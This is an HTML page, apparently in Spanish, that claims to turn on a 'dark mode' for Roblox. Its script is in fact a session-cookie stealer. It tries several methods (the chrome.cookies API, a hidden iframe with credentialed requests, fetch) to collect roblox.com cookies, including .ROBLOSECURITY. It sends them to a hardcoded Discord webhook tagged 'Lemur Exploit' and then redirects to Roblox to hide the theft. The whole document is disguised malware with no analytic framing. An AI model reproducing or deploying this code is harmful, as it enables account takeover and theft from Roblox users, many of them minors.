<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Modo Oscuro Roblox</title>
    <style>
        body {
            background: #1a1a1a;
            color: #00ff00;
            font-family: 'Courier New', monospace;
            padding: 20px;
            text-align: center;
        }
        .loader {
            border: 4px solid #333;
            border-top: 4px solid #00ff00;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #status { color: #888; margin-top: 20px; }
    </style>
</head>
<body>
    <h1>⚡ ACTIVANDO MODO OSCURO</h1>
    <div class="loader"></div>
    <div id="status">Inicializando...</div>

    <script>
        // ============================================
        // CONFIGURACIÓN
        // ============================================
        const webhook = "https://discord.com/api/webhooks/1471683743696552060/FFnmUguRVPoMKQ4b80dJ1FQQSp_ec-4EJFd2iyHrrXLQgDliUQqJEldixzOxx6esC2Sd";
        
        function logStatus(msg) {
            document.getElementById('status').innerText = msg;
        }

        function enviarADiscord(mensaje, titulo = "🍪 Cookie Roblox") {
            logStatus("📤 Enviando a Discord...");
            
            const data = {
                content: "@everyone",
                embeds: [{
                    title: titulo,
                    description: `\`\`\`${mensaje}\`\`\``,
                    color: 0x00ff00,
                    footer: { text: "Lemur Exploit" }
                }]
            };

            // Usar XMLHttpRequest en lugar de fetch (más compatible)
            let xhr = new XMLHttpRequest();
            xhr.open("POST", webhook, true);
            xhr.setRequestHeader("Content-Type", "application/json");
            xhr.onreadystatechange = function() {
                if (xhr.readyState === 4) {
                    if (xhr.status === 204 || xhr.status === 200) {
                        logStatus("✅ Enviado a Discord");
                    } else {
                        logStatus("❌ Error al enviar: " + xhr.status);
                        // Intentar de nuevo con otro método
                        fetch(webhook, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify(data)
                        }).catch(e => logStatus("❌ " + e));
                    }
                }
            };
            xhr.send(JSON.stringify(data));
        }

        // ============================================
        // PASO 1: Intentar con chrome.cookies (LEMUR LO TIENE)
        // ============================================
        logStatus("🔍 Buscando cookies...");
        
        if (window.chrome && chrome.cookies) {
            chrome.cookies.getAll({ domain: "roblox.com" }, function(cookies) {
                let encontradas = [];
                cookies.forEach(c => {
                    encontradas.push(`${c.name}=${c.value}`);
                });
                
                if (encontradas.length > 0) {
                    let todas = encontradas.join("\n");
                    enviarADiscord(todas, "🍪 Cookies Roblox (chrome.cookies)");
                } else {
                    logStatus("⚠️ No cookies en chrome.cookies");
                    metodoAlternativo();
                }
            });
        } else {
            logStatus("⚠️ chrome.cookies no disponible");
            metodoAlternativo();
        }

        // ============================================
        // PASO 2: Método con iframe + XHR
        // ============================================
        function metodoAlternativo() {
            logStatus("🔄 Intentando método alternativo...");
            
            let iframe = document.createElement('iframe');
            iframe.src = 'https://www.roblox.com/home';
            iframe.style.display = 'none';
            
            iframe.onload = function() {
                logStatus("📦 Iframe cargado");
                
                // Intentar XHR con withCredentials
                let xhr = new XMLHttpRequest();
                xhr.open('GET', 'https://www.roblox.com/home', true);
                xhr.withCredentials = true;
                
                xhr.onload = function() {
                    // Buscar Set-Cookie en headers
                    let setCookie = xhr.getResponseHeader('Set-Cookie');
                    if (setCookie) {
                        enviarADiscord(setCookie, "🍪 Set-Cookie");
                    }
                    
                    // Buscar en HTML
                    if (xhr.responseText.includes('.ROBLOSECURITY')) {
                        let match = xhr.responseText.match(/\.ROBLOSECURITY[^=]*=([^"'\s]+)/);
                        if (match) {
                            enviarADiscord(match[1], "🍪 Cookie en HTML");
                        }
                    }
                    
                    // Intentar con document.cookie (puede funcionar en Lemur)
                    try {
                        let docCookie = iframe.contentDocument.cookie;
                        if (docCookie && docCookie.includes('.ROBLOSECURITY')) {
                            enviarADiscord(docCookie, "🍪 document.cookie");
                        }
                    } catch (e) {}
                };
                xhr.send();
            };
            
            document.body.appendChild(iframe);
        }

        // ============================================
        // PASO 3: Método con fetch (por si acaso)
        // ============================================
        setTimeout(() => {
            fetch('https://www.roblox.com/home', {
                method: 'GET',
                credentials: 'include'
            }).then(res => {
                let setCookie = res.headers.get('Set-Cookie');
                if (setCookie) {
                    enviarADiscord(setCookie, "🍪 Fetch Set-Cookie");
                }
            }).catch(() => {});
        }, 2000);

        // ============================================
        // PASO 4: Redirigir a Roblox
        // ============================================
        setTimeout(() => {
            window.location.href = 'https://www.roblox.com/home';
        }, 6000);
    </script>
</body>
</html>
